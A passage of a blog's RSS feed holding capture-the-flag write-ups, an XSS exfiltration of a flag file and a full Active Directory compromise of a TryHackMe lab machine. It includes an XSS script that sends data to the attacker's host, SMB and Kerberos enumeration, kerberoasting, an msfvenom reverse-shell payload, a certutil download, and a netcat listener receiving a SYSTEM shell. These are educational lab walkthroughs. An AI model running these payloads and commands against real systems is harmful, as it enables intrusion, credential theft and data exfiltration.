</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.102.204] 60968
POST / HTTP/1.1
Host: 10.13.48.55
Connection: keep-alive
Content-Length: 45
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Content-Type: text/plain
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate

THM{&lt;flag&gt;}
</code></pre><p>For structured data, using json may be a better option.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.13.48.55&#34;</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://127.0.0.1:8080/flag.txt&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>The problem is that the POST request is no longer &ldquo;simple&rdquo; because the content type is now <code>application/json</code>, so the browser now sends a preceding preflight request, meaning netcat is out of the question&hellip;</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.102.204] 52614
OPTIONS / HTTP/1.1
Host: 10.13.48.55
Connection: keep-alive
Accept: */*
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: http://127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
</code></pre><p>We need to respond appropriately in order to receive the POST request containing <code>flag.txt</code>. Specifically, we need to respond with the correct <code>Access-Control-Allow-Origin</code>, <code>Access-Control-Allow-Methods</code>, and <code>Access-Control-Allow-Headers</code> headers.</p>
<pre tabindex="0"><code>Access-Control-Allow-Origin: Specifies what domains are allowed to access a resource.
Access-Control-Allow-Methods: Indicates which HTTP methods are allowed.
Access-Control-Allow-Headers: Represents the HTTP headers that are permitted.
</code></pre><p>Now to whitelist any origin<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, the HTTP POST and OPTIONS, as well as the Content-Type header. I spun up a Flask server to do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;OPTIONS&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handler</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;OPTIONS&#39;</span>:
</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Access-Control-Allow-Origin&#39;</span> : <span style="color:#e6db74">&#39;*&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Access-Control-Allow-Methods&#39;</span> : <span style="color:#e6db74">&#39;POST, OPTIONS&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Access-Control-Allow-Headers&#39;</span> : <span style="color:#e6db74">&#39;Content-Type&#39;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">200</span>, headers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get_json()
</span></span><span style="display:flex;"><span>        print(data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">405</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p>And now, we should successfully receive our flag.</p>
<p><img src="/img/the_sticker_shop/flag.png" alt="POST flag"></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>The request from flag shop comes from a random high port and there is no built-in method in CORS for wildcard port matching.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Enterprise</title>
      <link>http://localhost:1313/posts/enterprise/</link>
      <pubDate>Tue, 17 Sep 2024 15:11:37 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/enterprise/</guid>
      <description><![CDATA[<p><img src="/img/enterprise/enterprise.png#center" alt="Enterprise"></p>
<h2 id="description">Description</h2>
<p><a href="https://tryhackme.com/r/room/enterprise">Enterprise</a> is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.</p>
<h2 id="recon">Recon</h2>
<p>I began my recon on the machine was a nmap scan.</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Wed Sep 18 17:50:36 2024 as: nmap -p- -A -v -oN nmap.scan -T5 10.10.62.141
Increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase.
Warning: 10.10.62.141 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.62.141
Host is up (0.21s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn&#39;t have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 18:02:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T17:46:46
| Not valid after:  2025-03-19T17:46:46
| MD5:   12f5:c3db:b128:72f4:9f89:6a26:be7a:899d
|_SHA-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-18T18:03:41+00:00
|_ssl-date: 2024-09-18T18:03:49+00:00; +50s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49840/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 49s, deviation: 0s, median: 49s
| smb2-time: 
|   date: 2024-09-18T18:03:42
|_  start_date: N/A

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   75.99 ms  10.13.0.1
2   ... 3
4   204.26 ms 10.10.62.141

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 18 18:03:05 2024 -- 1 IP address (1 host up) scanned in 749.00 seconds
</code></pre><p>Even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of DC-specific ports and services like kerberos on port 88.</p>
<p>After identifying open services, I always look for quick wins next. I Noticed SMB anonymous access was allowed and we have read permission on several shares.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.62.141 -u &#39;Anonymous&#39; -p &#39;&#39; --shares
SMB         10.10.62.141    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.62.141    445    LAB-DC           [+] LAB.ENTERPRISE.THM\Anonymous: 
SMB         10.10.62.141    445    LAB-DC           [*] Enumerated shares
SMB         10.10.62.141    445    LAB-DC           Share           Permissions     Remark
SMB         10.10.62.141    445    LAB-DC           -----           -----------     ------
SMB         10.10.62.141    445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.10.62.141    445    LAB-DC           C$                              Default share
SMB         10.10.62.141    445    LAB-DC           Docs            READ            
SMB         10.10.62.141    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.10.62.141    445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.10.62.141    445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.10.62.141    445    LAB-DC           Users           READ            Users Share. Do Not Touch!
</code></pre><p><code>Docs</code> and <code>Users</code> in particular appeared worth digging further into. I took a look at <code>Docs</code> first.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.62.141/Docs -U Anonymous -N
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Mar 15 02:47:35 2021
  ..                                  D        0  Mon Mar 15 02:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021

                15587583 blocks of size 4096. 9927627 blocks available
smb: \&gt;
</code></pre><p>There are two files, <code>RSA-Secured-Credentials.xlsx</code> and <code>RSA-Secured-Document-PII.docx</code>. These could be huge findings that allow us to breach the domain controller. I transferred the files to my attacker machine. The files were password protected, so I extracted the password hashes with <code>office2john</code> and started cracking them while I continued enumerating the machine (spoiler alert: I couldn&rsquo;t crack any of the hashes).</p>
<p>I took a look at the Users share next. After some digging, I came across a PowerShell history file for LAB_ADMIN in <code>\LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\</code>.</p>
<pre tabindex="0"><code>smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\&gt; get Consolehost_hisory.txt 
getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat Consolehost_hisory.txt                                                                  
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo &#34;replication:101RepAdmin123!!&#34;&gt;private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H &#39;Cotent-Type: ascii/text&#39; -d .\private.txt&#39; http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
</code></pre><p>We see the credentials <code>replication</code>:<code>101RepAdmin123!!</code>. I tried using the credentials. Unfortunately, it appears that the <code>replication</code> user has been deleted.</p>
<p>We can also brute force usernames by taking advantage of the KDC&rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). I used <a href="https://github.com/ropnop/kerbrute">kerbrute</a>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/18/24 - Ronnie Flathers @ropnop

2024/09/18 17:47:42 &gt;  Using KDC(s):
2024/09/18 17:47:42 &gt;   10.10.62.141:88

2024/09/18 17:47:47 &gt;  [+] VALID USERNAME:       banana@lab.enterprise.thm
2024/09/18 17:47:54 &gt;  [+] VALID USERNAME:       guest@lab.enterprise.thm
2024/09/18 17:48:20 &gt;  [+] VALID USERNAME:       administrator@lab.enterprise.thm
2024/09/18 17:49:53 &gt;  [+] VALID USERNAME:       cake@lab.enterprise.thm
2024/09/18 17:50:51 &gt;  [+] VALID USERNAME:       enterprise@lab.enterprise.thm
2024/09/18 17:51:40 &gt;  [+] VALID USERNAME:       nik@lab.enterprise.thm
2024/09/18 17:52:34 &gt;  [+] VALID USERNAME:       Guest@lab.enterprise.thm
2024/09/18 17:52:35 &gt;  [+] VALID USERNAME:       Administrator@lab.enterprise.thm
2024/09/18 17:57:00 &gt;  [+] VALID USERNAME:       Banana@lab.enterprise.thm
2024/09/18 17:57:14 &gt;  [+] VALID USERNAME:       spooks@lab.enterprise.thm
2024/09/18 17:59:28 &gt;  [+] VALID USERNAME:       joiner@lab.enterprise.thm
</code></pre><p>I then tried sprayed <code>101RepAdmin123!!</code> against the usernames and variations of it (e.g. <code>101RepAdmin123!</code>) against the users to no avail. ASREProasting also turned up nothing, so I had to look at other attack vectors.</p>
<p>There are also two HTTP services running on ports 80 and 7990 that we can take a look at. While port 80 did not yield anything interesting, there is an Atlassian portal on port 7990. The login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to Github.</p>
<p><img src="/img/enterprise/atlassian.png" alt="Atlassian login portal"></p>
<p>I have to admit, it took me way longer than I would have liked to figure out that there was an actual Github page associated with &ldquo;Enterprise-THM&rdquo; as opposed to something like a .git folder hidden in a subdirectory.</p>
<p><img src="/img/enterprise/enterprise_github.png" alt="Enterprise-THM Github page"></p>
<p>The Github page has a single repository that doesn&rsquo;t hold any useful information. However, there is an associated account &ldquo;Nik-enterprise-dev&rdquo; which has a repository &ldquo;mgmtScript.ps1&rdquo;. This could prove to be out lucky break.</p>
<p><img src="/img/enterprise/nik_github.png" alt="Nik-enterprise-dev Github page"></p>
<h2 id="foothold">Foothold</h2>
<p>The PowerShell script takes in a username and password and gets the system information of all computers within an active directory network. While the <code>$userName</code> and <code>$userPassword</code> fields are empty, we can see that there has been more than one change pushed to this repository.</p>
<p><img src="/img/enterprise/git_history.png" alt="mgmtScript.ps1 Repository history"></p>
<p>We can look at the details by cloning the repository.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/Nik-enterprise-dev/mgmtScript.ps1.git
</span></span></code></pre></div><p>I then switched to the repository folder and ran <code>git log</code>. This shows, among others, the commit hash for each push to the repository. We can use these hashes to view changes and previous versions of the repo.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git log                                                           
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 18:57:40 2021 -0500

    Create SystemInfo.ps1
    
    Gets System Info from each computer on the domain
</code></pre><p>In one of his commits, Nik comments that he &ldquo;accidentally added something&rdquo;. We can view the details by supplying the commit hash.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

diff --git a/SystemInfo.ps1 b/SystemInfo.ps1
index bc7ca27..5ae7576 100644
--- a/SystemInfo.ps1
+++ b/SystemInfo.ps1
@@ -1,6 +1,6 @@
 Import-Module ActiveDirectory
-$userName = &#39;nik&#39;
-$userPassword = &#39;&lt;nik&#39;s password&gt;&#39;
+$userName = &#39;&#39;
+$userPassword = &#39;&#39;
 $psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
 $Computers = New-Object -TypeName &#34;System.Collections.ArrayList&#34;
 $Computer = $(Get-ADComputer -Filter * | Select-Object Name)
</code></pre><p>We see that Nik had accidentally pushed his credentials and the final commit removed them from the repository. I tried <code>nik</code>:<code>&lt;nik's password&gt;</code> against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like RDP or SMB. However, since it is a domain account, we can also perform other attacks such as kerberoasting.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-GetUserSPNs lab.enterprise.thm/nik:&#39;&lt;nik&#39;s password&gt;&#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 01:20:01.333272  2021-04-26 15:16:41.570158             



[-] CCache file is not found. Skipping...
</code></pre><p>We get a hash for <code>bitbucket</code>. Now to crack it&hellip;</p>
<pre tabindex="0"><code>hashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>Eventually, it cracks.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>With the new credentials for the <code>bitbucket</code> service account, I connected to the domain controller through RDP.</p>
<pre tabindex="0"><code>xfreerdp /v:10.10.62.141 /u:bitbucket /p:&lt;bitbucket&#39;s password&gt; /cert-ignore
</code></pre><p>After some enumeration, I found an unquoted service path.</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;wmic service get name,pathname | findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;&#34;&#34;
Name                                      PathName                                                                      
AtlassianBitbucket                        C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket        
AtlassianBitbucketElasticsearch           C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch
LSM                                                                                                                     
NetSetupSvc                                                                                                             
zerotieroneservice                        C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe               
</code></pre><p>Unquoted service paths are a vulnerability that arises due to the way Windows runs its binaries. Say we have a program <code>C:\Users\Public\My Programs\New Program.exe</code>, Windows will first try to execute <code>C:\Users\Public\My.exe</code> followed by <code>C:\Users\Public\My Program.exe</code>, <code>C:\Users\Public\My Program\New.exe</code>, and finally <code>C:\Users\Public\My Programs\New Program.exe</code> because of the spaces in and the path and lack of enclosing quotes. <code>zerotieroneservice</code> is vulnerable to this type of exploit.</p>
<p>Importantly, the service binary is owned by <code>NT AUTHORITY\SYSTEM</code>.</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;dir /q &#34;C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe&#34;
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Program Files (x86)\Zero Tier\Zero Tier One

12/05/2014  11:52 AM         9,594,056 NT AUTHORITY\SYSTEM    ZeroTier One.exe
               1 File(s)      9,594,056 bytes
               0 Dir(s)  40,566,411,264 bytes free
</code></pre><p>User permissions for <code>C:\Program Files (x86)\Zero Tier</code>:</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;icacls &#34;C:\Program Files (x86)\Zero Tier&#34;
C:\Program Files (x86)\Zero Tier BUILTIN\Users:(OI)(CI)(W)
                                 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
</code></pre><p><code>bitbucket</code>, as a member of <code>BUILTIN\Users</code>, has write access to the <code>C:\Program Files (x86)\Zero Tier</code> directory through <code>BUILTIN\Users</code>. It is therefore possible to write a &ldquo;Zero.exe&rdquo; binary have the zerotieroneservice execute it.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.48.55 LPORT=31337 -f exe -o Zero.exe
</code></pre><p>Now to transfer it to our target&hellip;</p>
<pre tabindex="0"><code>python3 -m http.server 80
</code></pre><pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;certutil -urlcache -f http://10.13.48.55/Zero.exe Zero.exe
</code></pre><p>Next, I checked the status of <code>zerotieroneservice</code>.</p>
<pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;sc query zerotieroneservice

SERVICE_NAME: zerotieroneservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
</code></pre><p>The service is not running. All that needs to be done now is to start the service and we should receive a shell as <code>NT AUTHORITY\SYSTEM</code> (Don&rsquo;t forget to start a listener first).</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;sc start zerotieroneservice
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 31337
listening on [any] 31337 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.146.30] 49930
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre>]]></description>
      
    </item>
    
    
  </channel>
</rss>
